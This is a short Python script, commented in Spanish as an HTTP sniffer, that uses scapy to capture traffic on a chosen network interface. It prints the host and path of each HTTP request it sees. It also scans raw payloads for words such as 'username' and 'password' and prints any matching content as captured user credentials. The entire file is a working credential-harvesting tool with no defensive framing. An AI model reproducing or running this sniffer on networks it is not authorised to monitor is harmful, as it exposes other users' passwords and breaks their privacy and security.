#Sniffer para HTTP
import argparse
parse = argparse.ArgumentParser()
parse.add_argument("--Interface",help="Interface to monitor")
args = parse.parse_args()
import scapy.all as scapy 
from scapy.layers import http
def sniff(interface):
   scapy.sniff(iface=interface,store=False,prn=process_sniffer_packet)
def get_url(packet):
  return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path   
def get_login_info(packet):
   if packet.haslayer(scapy.Raw):
       load = packet[scapy.Raw].load 
       keywords = ["username","user","login","password","pass"]
       for keyword in keywords:
         if keyword in load.decode():
           return load.decode()

def process_sniffer_packet(packet):
   if packet.haslayer(http.HTTPRequest):
      url = get_url(packet)
      print("Request HTTP >> " + str(url))
      print()
      login_info = get_login_info(packet)
      if login_info:
       print("\nUser and password: ", login_info, "\n")
try:
   sniff(args.Interface)
except:
    print("Error")   
